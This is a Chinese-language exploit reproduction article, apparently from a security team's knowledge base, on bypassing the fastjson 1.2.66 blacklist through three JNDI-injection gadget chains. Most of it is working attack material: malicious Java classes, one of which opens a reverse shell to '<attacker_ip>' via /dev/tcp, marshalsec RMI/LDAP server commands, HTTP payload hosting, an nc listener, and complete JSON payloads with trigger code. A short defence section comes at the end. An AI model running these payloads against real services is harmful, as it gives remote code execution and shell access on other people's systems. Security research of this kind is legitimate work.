---
title: Fastjson 1.2.66 黑名单绕过利用链：Shiro-core、Anteros-DBCP 与 JdbcRowSetImpl 触发 JNDI 注入
  RCE 完整复现
description: 深度分析 fastjson 1.2.66 版本在开启 autotype 的前提下，通过 shiro-core 中的 JndiObjectFactory、Anteros-DBCP
  中的 AnterosDBCPConfig 以及 com.sun.rowset.JdbcRowSetImpl 三条利用链绕过黑名单，触发 JNDI 注入实现远程代码执行的完整复现过程，包含
  Maven 依赖配置、恶意类编写、marshalsec 监听部署及 POC 构造细节。
category: program-analysis
tags:
- fastjson
- 反序列化
- JNDI注入
- RCE
- shiro-core
- Anteros-DBCP
- JdbcRowSetImpl
- 黑名单绕过
- marshalsec
- 漏洞复现
date: '2023-04-13'
updated: '2026-11-15'
---

## 概述

fastjson 1.2.66 版本虽然引入了黑名单机制限制危险类的反序列化，但在开启 `autotype`（`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`）的前提下，仍可通过引入特定第三方依赖包中的特定类或 JDK 自带类绕过黑名单，触发 JNDI 注入实现远程代码执行。本文详细复现三条经实战验证的利用链：

1. **shiro-core** 中的 `org.apache.shiro.jndi.JndiObjectFactory`
2. **Anteros-DBCP** 中的 `com.anteros.dbcp.AnterosDBCPConfig`
3. **JDK 自带** `com.sun.rowset.JdbcRowSetImpl`（无需额外依赖）

三条链均利用 `lookup` 方法触发 JNDI 查找，配合 marshalsec 恶意服务端实现任意命令执行。

## 环境准备

### Maven 依赖配置

在项目 `pom.xml` 中引入 fastjson 1.2.66 及两个目标依赖（JdbcRowSetImpl 为 JDK 自带，无需额外引入）：

```xml
<!-- fastjson 1.2.66（含黑名单机制） -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.66</version>
</dependency>

<!-- shiro-core 1.5.1：含 JndiObjectFactory -->
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.5.1</version>
</dependency>

<!-- Anteros-DBCP：含 AnterosDBCPConfig -->
<dependency>
    <groupId>com.anteros</groupId>
    <artifactId>anteros-dbcp</artifactId>
    <version>2.1.3</version>
</dependency>
```

> **注意**：必须显式开启 `autotype`，否则 fastjson 默认拒绝反序列化指定 `@type` 的类。

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

## 利用链一：shiro-core JndiObjectFactory

### 核心类分析

在 `shiro-core-1.5.1.jar` 中搜索 `lookup` 关键字，定位到 `org.apache.shiro.jndi.JndiObjectFactory`：

```java
public class JndiObjectFactory implements ObjectFactory {
    private String resourceName;
    private String resourceRef;

    public void setResourceName(String resourceName) { this.resourceName = resourceName; }
    public void setResourceRef(String resourceRef) { this.resourceRef = resourceRef; }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        // 内部会调用 InitialContext.lookup(resourceName) 触发 JNDI 查找
        return lookup(resourceName, resourceRef);
    }
}
```

该类实现了 `javax.naming.spi.ObjectFactory` 接口，`getObjectInstance` 方法在 JNDI 注入场景下会被自动调用，并执行 `lookup`。

### 恶意类编写与编译

编写实现 `ObjectFactory` 接口的恶意类，在 `getObjectInstance` 中执行命令：

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        try {
            // macOS 弹计算器示例；Linux 可改为 "bash -c {echo,base64_payload}|{base64,-d}|{bash,-i}"
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
}
```

编译生成 `Exploit.class`：

```bash
javac Exploit.java
```

### marshalsec 监听部署

使用 marshalsec 启动 RMI/LDAP 恶意服务端，指定恶意类路径：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://<attacker_ip>:8090/#Exploit" 1099
```

将编译好的 `Exploit.class` 放置在攻击机 Web 目录（如 Python 简单 HTTP 服务）的 8090 端口下：

```bash
python3 -m http.server 8090
```

### POC 构造与触发

fastjson 反序列化 payload，指定 `@type` 为 `org.apache.shiro.jndi.JndiObjectFactory`，并设置 `resourceName` 指向恶意 RMI 地址：

```json
{
    "@type": "org.apache.shiro.jndi.JndiObjectFactory",
    "resourceName": "rmi://<attacker_ip>:1099/Exploit"
}
```

Java 触发代码：

```java
String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"rmi://<attacker_ip>:1099/Exploit\"}";
JSON.parse(payload);  // 触发反序列化与 JNDI 注入
```

成功执行后，目标机器将弹出计算器（或执行指定命令）。

## 利用链二：Anteros-DBCP AnterosDBCPConfig

### 核心类分析

在 `anteros-dbcp` 包中搜索 `lookup`，定位到 `com.anteros.dbcp.AnterosDBCPConfig`，其 `setMetricRegistry` 方法调用链最终触发 `getObjectOrPerformJndiLookup`：

```java
public class AnterosDBCPConfig {
    private String metricRegistry;

    public void setMetricRegistry(String metricRegistry) {
        this.metricRegistry = metricRegistry;
        // 内部调用 getObjectOrPerformJndiLookup(metricRegistry)
        getObjectOrPerformJndiLookup(metricRegistry);
    }

    private Object getObjectOrPerformJndiLookup(String jndiName) {
        // 执行 InitialContext.lookup(jndiName)
        return new InitialContext().lookup(jndiName);
    }
}
```

### POC 构造与触发

fastjson 反序列化 payload，指定 `@type` 为 `com.anteros.dbcp.AnterosDBCPConfig`，并设置 `metricRegistry` 指向恶意 RMI/LDAP 地址：

```json
{
    "@type": "com.anteros.dbcp.AnterosDBCPConfig",
    "metricRegistry": "rmi://<attacker_ip>:1099/Exploit"
}
```

Java 触发代码：

```java
String payload = "{\"@type\":\"com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://<attacker_ip>:1099/Exploit\"}";
JSON.parse(payload);  // 触发反序列化与 JNDI 注入
```

同样可实现任意命令执行。

## 利用链三：JDK 自带 JdbcRowSetImpl（无需额外依赖）

### 核心类分析

`com.sun.rowset.JdbcRowSetImpl` 为 JDK 自带类（位于 `rt.jar`），实现了 `javax.sql.RowSet` 接口。其 `setDataSourceName` 方法在自动提交模式（`autoCommit=true`）下会触发 JNDI 查找：

```java
public class JdbcRowSetImpl extends BaseRowSet implements RowSetInternal, Serializable {
    public void setDataSourceName(String dataSourceName) {
        this.dataSourceName = dataSourceName;
        if (this.autoCommit) {
            // 触发 JNDI lookup
            InitialContext ctx = new InitialContext();
            DataSource ds = (DataSource) ctx.lookup(dataSourceName);
            this.setDataSource(ds);
        }
    }
    public void setAutoCommit(boolean autoCommit) { this.autoCommit = autoCommit; }
}
```

由于该类为 JDK 内置，无需引入任何第三方依赖，利用条件极为宽松。

### 恶意类编写与编译（反弹 Shell 示例）

编写恶意类，构造函数中执行反弹 Shell 命令（Linux 环境）：

```java
public class Exploit {
    public Exploit() {
        try {
            // 反弹 Shell 到攻击机 IP:12345
            java.lang.Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/12345 0>&1"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}
```

编译生成 `Exploit.class`：

```bash
javac Exploit.java
```

### marshalsec 监听部署

启动 RMI 恶意服务端（端口 1099），指定 HTTP 服务地址提供恶意类：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://<attacker_ip>:8888/#Exploit" 1099
```

> **注意**：若 RMI 方式受限（如高版本 JDK 限制 `trustURLCodebase`），可改用 LDAP：
> ```bash
> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<attacker_ip>:8888/#Exploit" 1389
> ```
> 此时 POC 中协议改为 `ldap://<attacker_ip>:1389/Exploit`。

### HTTP 服务部署

在存放 `Exploit.class` 的目录下启动简单 HTTP 服务（端口 8888）：

```bash
# Python 3
python3 -m http.server 8888

# Python 2
python -m SimpleHTTPServer 8888
```

### 监听反弹 Shell

攻击机监听指定端口（12345）：

```bash
nc -lvnp 12345
```

### POC 构造与触发

fastjson 反序列化 payload，利用嵌套 `@type` 绕过黑名单检测（`java.lang.Class` 不在黑名单中）：

```json
{
    "name": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "x": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://<attacker_ip>:1099/Exploit",
        "autoCommit": true
    }
}
```

Java 触发代码：

```java
String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://<attacker_ip>:1099/Exploit\",\"autoCommit\":true}}";
JSON.parse(payload);  // 触发反序列化与 JNDI 注入
```

### 执行流程解析

1. 目标服务器解析 JSON，遇到 `name` 字段的 `java.lang.Class` 实例化 `JdbcRowSetImpl` 类对象
2. 解析 `x` 字段，反序列化为 `JdbcRowSetImpl` 对象，设置 `dataSourceName` 为恶意 RMI 地址，`autoCommit=true`
3. `setDataSourceName` 触发 `InitialContext.lookup("rmi://<attacker_ip>:1099/Exploit")`
4. 连接攻击机 marshalsec RMI 服务（1099 端口）
5. marshalsec 返回 HTTP 重定向至 `http://<attacker_ip>:8888/#Exploit`
6. 目标机从 Python HTTP 服务（8888 端口）下载 `Exploit.class`
7. 目标机加载并实例化 `Exploit`，执行构造函数中的反弹 Shell 命令
8. 攻击机 `nc` 接收到反弹 Shell

## 检测与防御建议

1. **升级 fastjson**：升级至 1.2.68+ 版本，黑名单机制持续更新，且默认关闭 `autotype`。
2. **禁用 autotype**：生产环境严禁开启 `ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`。
3. **JNDI 注入防护**：
   - JDK 8u191+ / 11.0.1+ / 12.0.1+ 默认限制 `com.sun.jndi.rmi.object.trustURLCodebase` 与 `com.sun.jndi.ldap.object.trustURLCodebase` 为 `false`，阻断远程类加载。
   - 可通过 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=false` 显式加固。
4. **依赖排查**：排查项目传递依赖中是否引入 `shiro-core`、`anteros-dbcp` 等含 JNDI lookup 类的库，若非必要请移除或升级至安全版本。
5. **流量监控**：部署 WAF/RASP 监控 fastjson 反序列化特征 payload（`@type` 指定危险类、包含 `rmi://` `ldap://` 等协议头）。
6. **JdbcRowSetImpl 针对性防护**：因其为 JDK 内置类，重点监控 `com.sun.rowset.JdbcRowSetImpl` 的反序列化尝试，结合 `autoCommit=true` 与 `dataSourceName` 指向外部地址的特征进行拦截。

## 交叉引用

- [[log4j2-rce-reproduction]] — Log4j2 Log4Shell (CVE-2021-44228) JNDI 注入 RCE 完整复现，对比 fastjson 与 Log4j2 反序列化利用链异同
- [[shiro-internal-penetration-case-study]] — Shiro RCE 初始访问结合内网渗透实战案例，涵盖免杀上线 Cobalt Strike、NTLM 凭证导出、FTP 横向移动
- [[cve-2023-25194-kafka-connect-jndi-rce]] — Apache Kafka Connect 基于 SASL JAAS 配置的 JNDI 注入 RCE 分析
- [[python-pickle-deserialization-rce]] — Python pickle `__reduce__` 反序列化 RCE 原理与利用链构造
- [[dotnet-xmlserializer-expandedwrapper-deserialization-gadget]] — .NET XmlSerializer ExpandedWrapper Gadget 链反序列化 RCE 分析
- [[xxe-xml-dtd-fundamentals]] — XXE 外部实体注入与 JNDI 注入在带外数据外带层面的相似性对比

## 参考资源

- marshalsec 项目：https://github.com/mbechler/marshalsec
- JNDI-Exploit-Bypass-Demo：https://github.com/welk1n/JNDI-Injection-Exploit
- fastjson 安全更新公告：https://github.com/alibaba/fastjson/wiki/security_update_20220523
- JDK JNDI 防护机制说明：https://www.oracle.com/java/technologies/javase/8u191-relnotes.html
- 226安全团队内部周分享视频：https://www.bilibili.com/video/av61292292/

## 来源

- [226安全团队-201805-202103_09](../sources/226安全团队-201805-202103_09.md)
- [226安全团队-201805-202103_14](../sources/226安全团队-201805-202103_14.md)
